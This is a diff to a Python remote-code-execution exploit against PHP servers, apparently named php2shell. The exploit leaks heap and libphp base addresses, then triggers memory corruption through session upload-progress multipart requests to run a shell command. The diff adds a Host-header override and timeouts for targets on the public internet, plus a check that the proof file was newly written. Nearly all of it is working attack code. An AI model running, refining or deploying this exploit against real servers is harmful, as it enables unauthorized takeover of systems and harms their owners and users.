@@ -19,7 +19,7 @@ session.upload_progress.enabled=1 + 存在 session_start() 消费点。
 依赖：poc_eness/poc_109618.py（build_multipart/parse_cookie/chunk_base_from_cookie/
 libphp_base_from_cookie/Exploit._file_part/_big_field/_fake_payload/rotate）。
 """
-import sys, time, struct, argparse, os, socket
+import sys, time, struct, argparse, os, socket, re, hashlib
 
 HERE = os.path.dirname(os.path.abspath(__file__))
 sys.path.insert(0, os.path.join(HERE, '..', 'poc_eness'))
@@ -39,6 +39,18 @@ STAGE2_V = 16
 
 # ---- TLS 开关（由上层按目标 scheme 设置；exploit 阶段全部走 _dial）----
 TLS_STATE = {"enabled": False, "insecure": True, "server_hostname": None}
+
+# ---- 公网链路参数：超时与 Host 头覆盖 ----
+NET_STATE = {"timeout": 120.0, "host_header": None}
+
+
+def set_net(timeout=None, host_header=None):
+    """timeout 覆盖裸 socket 连接/读写；host_header 用于「访问 IP、vhost 认域名」。"""
+    if timeout:
+        NET_STATE["timeout"] = float(timeout)
+    if host_header is not None:
+        NET_STATE["host_header"] = host_header
+    return dict(NET_STATE)
 
 
 def set_tls(enabled, insecure=None, server_hostname=None):
@@ -130,8 +142,9 @@ def read_resp(sock, cap=1 << 22):
 
 
 def raw_request(host, port, path, body, boundary, cookie=None, keep_alive=True):
+    host_hdr = NET_STATE["host_header"] or f"{host}:{port}"
     hdr = (f"POST {path} HTTP/1.1\r\n"
-           f"Host: {host}:{port}\r\n"
+           f"Host: {host_hdr}\r\n"
            f"User-Agent: {_ua()}\r\n"
            f"Accept: */*\r\n")
     if cookie:
@@ -152,12 +165,13 @@ def _ua() -> str:
     return "php2shell-rce"
 
 
-def _dial(host, port, timeout=120.0):
+def _dial(host, port, timeout=None):
     """连接目标；设置了 P.DEFAULT_PROXY 时经单个代理（http CONNECT / socks5）。
 
     TLS_STATE.enabled 为真时（目标为 https）在此统一套一层 TLS，
     因此 stage1/2/3、keepalive_pair 等全部阶段自动获得 https 能力。
     """
+    timeout = timeout or NET_STATE["timeout"]
     proxy = getattr(P, "DEFAULT_PROXY", None) if P is not None else None
     if proxy:
         t = P.Target("http://%s:%d/" % (host, port), timeout=timeout, verbose=False)
@@ -168,7 +182,7 @@ def _dial(host, port, timeout=120.0):
 
 def keepalive_pair(host, port, path, first, second, cap1, cap2, cookie1=None):
     """同一 TCP 连接发 污染A(first) → 解引用B(second)，返回 (respA, respB)。"""
-    s = _dial(host, port, 120)
+    s = _dial(host, port)
     ba, bb = first
     s.sendall(raw_request(host, port, path, ba, bb, cookie=cookie1, keep_alive=True))
     r1 = read_resp(s, cap1)
@@ -289,10 +303,51 @@ def leak_libphp_base(host, port, path, ex, t_pos=STAGE2_T, attempts=30):
     return None
 
 
+class ProofWatch:
+    """只接受「本次运行创建/修改过、非空、且匹配 require」的 proof 文件。
+
+    真实目标上 proof 是远端产物；本机路径只有在容器目录挂载时才可读。
+    伪造成功最常见的来源是「路径上本来就有个旧文件」，因此必须比对运行前指纹。
+    """
+
+    def __init__(self, path, require=None):
+        self.path = path
+        self.re = re.compile(require.encode()) if require else None
+        self.before = self._sig()
+
+    def _sig(self):
+        if not self.path:
+            return None
+        try:
+            st = os.stat(self.path)
+            with open(self.path, "rb") as f:
+                head = f.read(1 << 20)
+        except OSError:
+            return None
+        return (st.st_mtime_ns, st.st_size, hashlib.sha256(head).hexdigest())
+
+    def hit(self):
+        """返回 proof 内容 bytes；不成立返回 None。"""
+        if not self.path:
+            return None
+        sig = self._sig()
+        if sig is None or sig == self.before or sig[1] <= 0:
+            return None
+        try:
+            with open(self.path, "rb") as f:
+                data = f.read()
+        except OSError:
+            return None
+        if self.re and not self.re.search(data):
+            return None
+        return data
+
+
 def do_rce(host, port, path, ex, chunk_base, libphp_base, cmd, htdata_offset,
-           zif_offset, proof_file, rounds=30):
+           zif_offset, proof_file, rounds=30, proof_require=None):
     htdata = chunk_base + htdata_offset
     zif = libphp_base + zif_offset
+    watch = ProofWatch(proof_file, proof_require)
     print(f"[Stage-3] htdata={hex(htdata)} zif={hex(zif)} cmd={cmd!r}", flush=True)
     for i in range(rounds):
         try:
@@ -310,10 +365,11 @@ def do_rce(host, port, path, ex, chunk_base, libphp_base, cmd, htdata_offset,
             continue
         oom = b'Fatal error' in r1 or b'memory' in r1.lower()
         print(f"[{i}] 污染A={len(r1)}B oom={oom} 解引用B={len(r2)}B", flush=True)
-        if proof_file and os.path.exists(proof_file):
-            print(f"[+] RCE 成功! proof={proof_file}", flush=True)
+        data = watch.hit()
+        if data is not None:
+            print(f"[+] RCE 成功! proof={proof_file} ({len(data)}B，本次运行新写入)", flush=True)
             try:
-                print(open(proof_file, 'rb').read().decode('latin1'), flush=True)
+                print(data.decode('latin1'), flush=True)
             except Exception:
                 pass
             return True
@@ -326,6 +382,8 @@ def main():
     ap.add_argument('-u', '--url', required=True)
     ap.add_argument('-c', '--cmd', default='id>/out/p1')
     ap.add_argument('--proof-file', default=None, help='RCE 后 proof 文件路径（主机侧，命中则停止）')
+    ap.add_argument('--proof-require', default=None, metavar='REGEX',
+                    help='proof 内容必须匹配的 regex（如 "uid=\\d+"）；不匹配不算成功')
     ap.add_argument('--profile', default='bookworm')
     ap.add_argument('--zif-offset', default=ZIF_OFFSET, type=lambda x: int(x, 0))
     ap.add_argument('--dtor-offset', default=DTOR_OFFSET, type=lambda x: int(x, 0))
@@ -333,6 +391,10 @@ def main():
     ap.add_argument('--stage1-n', default=STAGE1_N, type=int)
     ap.add_argument('--stage2-t', default=STAGE2_T, type=int)
     ap.add_argument('--rounds', default=30, type=int)
+    ap.add_argument('--timeout', default=120.0, type=float,
+                    help='裸 socket 连接/读写超时（公网高延迟/大 body 建议 ≥120）')
+    ap.add_argument('--host-header', default=None,
+                    help='覆盖 Host 头（按 IP 访问但 vhost 只认域名时用）')
     ap.add_argument('--skip-leak', action='store_true', help='跳过 Stage-1/2，需 --chunk-base/--libphp-base')
     ap.add_argument('--chunk-base', default=None, type=lambda x: int(x, 0))
     ap.add_argument('--libphp-base', default=None, type=lambda x: int(x, 0))
@@ -343,7 +405,10 @@ def main():
         sys.exit(1)
 
     host, port, path = parse_target(args.url)
-    ex = P.Exploit(P.Target(args.url, timeout=60.0, verbose=False), args.cmd,
+    set_net(timeout=args.timeout, host_header=args.host_header)
+    if args.host_header:
+        P.DEFAULT_HOST_HEADER = args.host_header
+    ex = P.Exploit(P.Target(args.url, timeout=args.timeout, verbose=False), args.cmd,
                    zif_offset=args.zif_offset, dtor_offset=args.dtor_offset,
                    htdata_offset=args.htdata_offset, profile=args.profile, verbose=False)
     ex.stage1_n = args.stage1_n
@@ -364,9 +429,8 @@ def main():
 
     print(f'[*] chunk_base={hex(chunk_base)} libphp_base={hex(libphp_base)}', flush=True)
     ok = do_rce(host, port, path, ex, chunk_base, libphp_base, args.cmd,
-                args.htdata_offset, args.zif_offset, args.proof_file, args.rounds)
-    if not ok and args.proof_file and os.path.exists(args.proof_file):
-        ok = True
+                args.htdata_offset, args.zif_offset, args.proof_file, args.rounds,
+                proof_require=args.proof_require)
     print('[结果] ' + ('RCE 成功' if ok else '未命中（可增加 --rounds 或检查偏移）'), flush=True)
     sys.exit(0 if ok else 2)
 
